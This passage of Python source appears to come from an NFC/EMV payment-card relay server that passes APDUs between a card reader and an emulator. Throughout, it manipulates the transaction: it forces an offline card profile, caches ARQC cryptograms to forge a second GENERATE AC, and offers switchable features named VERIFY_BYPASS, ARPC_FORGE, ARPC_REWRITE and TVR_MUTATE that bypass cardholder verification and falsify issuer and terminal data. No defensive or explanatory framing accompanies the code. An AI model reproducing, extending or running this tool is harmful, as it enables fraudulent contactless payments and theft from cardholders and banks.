        pending_name = INS_MAP.get(pending_ins, "?") if pending_ins is not None else "?"
        _record_apdu(f"{src[:3]}>{dst[:3]}", "RAPDU", pending_name, payload, note=f"SW={sw}")
        log.info(f"RAPDU sw={sw} {src} > {dst}")

    def _observe_reader_rapdu(self, payload: bytes) -> None:
        pending = self.state.pending_capdu
        if not pending or len(pending) < 2:
            return
        ins = pending[APDU_INS]
        if ins == INS_GET_PROCESSING_OPTIONS:
            tmpl = detect_gpo_template(payload)
            with self.lock:
                self.state.gpo_template = tmpl
            if tmpl is not None:
                log.info(f"GPO template cached: 0x{tmpl:02X}")
            else:
                log.warning("GPO response used unknown template - 2nd GAC forge may fail")
            return
        if ins == INS_GENERATE_AC:
            cache = extract_arqc(payload, self.state.gpo_template)
            if cache.template is None:
                cache.template = self.state.gpo_template
            is_arqc, reason = cid_is_arqc(cache, payload)
            with self.lock:
                self.state.arqc_cache = cache
                self.state.second_ae_pending = is_arqc
                self.state.second_ae_reason = reason
            for n in cache.parse_notes:
                log.debug(f"[GAC-PARSE] {n}")
            if is_arqc:
                log.info(f"[ARQC-CACHED] template={cache.template} brand={self.state.brand} "
                         f"ATC={cache.atc.hex() if cache.atc else '?'} "
                         f"AC={cache.ac.hex() if cache.ac else '?'} reason='{reason}' -> 2nd GAC armed")
            else:
                log.warning(f"[NO-ARQC] 2nd GAC not armed: {reason}")

    # ---------- SELECT handler with offline profile + CDOL1 pre-fetch ----------
    def _handle_select(self, raw_fci: bytes) -> bytes:
        """Called from emulator side when building SELECT response."""
        # 1) force CO-O / Legacy AID
        forced = force_offline_fci(raw_fci)
        # 2) pre-fetch CDOL1 synchronously
        def send_apdu(apdu: bytes) -> bytes:
            # send to reader and wait for response (blocking)
            self._send(self.reader_addr, SID_CAPDU, apdu)
            # simple wait - in real code you'd have a queue per session
            # Here we just poll the socket until a matching RAPDU arrives
            deadline = time.time() + 2.0
            while time.time() < deadline:
                try:
                    data, addr = self.sock.recvfrom(RECV_BUFFER)
                    parsed = parse_frame(data)
                    if parsed and parsed[0] == SID_RAPDU and addr == self.reader_addr:
                        return parsed[1]
                except socket.timeout:
                    continue
            return b""
        prefetch_cdol1(self.state.__dict__, send_apdu)
        return forced

    # ---------- Heartbeat / Ctrl ----------
    def _handle_heartbeat(self, payload: bytes, addr: Tuple[str, int]) -> None:
        self._ack(addr)

    def _handle_ctrl(self, payload: bytes, addr: Tuple[str, int]) -> None:
        cmd = payload.decode(errors="replace").strip().upper()
        log.info(f"CTRL from {addr}: {cmd}")
        if cmd == "CARD_PRESENT":
            self.state.card_present = True
            if self.emulator_addr: self._send(self.emulator_addr, SID_CTRL, payload)
            return
        if cmd == "CARD_REMOVED":
            self.state.card_present = False
            if self.emulator_addr: self._send(self.emulator_addr, SID_CTRL, payload)
            return
        if cmd == "SESSION_RESET":
            with self.lock: self.state.reset()
            if packet_router:
                try: packet_router.reset_session()
                except Exception: pass
            log.info(f"Session reset - seq={self.state.seq}")
            target = self.emulator_addr if addr == self.reader_addr else self.reader_addr
            if target: self._send(target, SID_CTRL, payload)
            return
        if cmd == "STATUS":
            aid_hex = self.state.selected_aid.hex().upper() if self.state.selected_aid else None
            status = {
                "ready": self.reader_addr and self.emulator_addr,
                "reader": self.reader_addr is not None,
                "emulator": self.emulator_addr is not None,
                "card_present": self.state.card_present,
                "verify_bypass": self.state.verify_bypass_enabled,
                "arpc_forge": self.state.arpc_forge_enabled,
                "arpc_rewrite": self.state.arpc_rewrite_enabled,
                "tvr_mutation": self.state.tvr_mutation_enabled,
                "brand": self.state.brand,
                "selected_aid": aid_hex,
                "seq": self.state.seq,
            }
            self._send(addr, SID_CTRL, json.dumps(status).encode())
            return
        # toggle handling ...
        toggles = {
            "VERIFY_BYPASS": "verify_bypass_enabled",
            "ARPC_FORGE": "arpc_forge_enabled",
            "ARPC_REWRITE": "arpc_rewrite_enabled",
            "TVR_MUTATE": "tvr_mutation_enabled",
        }
        for prefix, attr in toggles.items():
            if cmd == f"{prefix} ON":
                setattr(self.state, attr, True)
                log.info(f"{prefix} ENABLED")
                self._ctrl(addr, f"OK {prefix}=ON"); return
            if cmd == f"{prefix} OFF":
                setattr(self.state, attr, False)
                log.info(f"{prefix} DISABLED")
                self._ctrl(addr, f"OK {prefix}=OFF"); return
        # forward unknown
        target = self.emulator_addr if addr == self.reader_addr else self.reader_addr
        if target: self._send(target, SID_CTRL, payload)

def main():
    import sys
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 5566
    server = RelayServer(port=port)
    try:
        server.start()
    except KeyboardInterrupt:
        server.stop()

if __name__ == "__main__":
    main()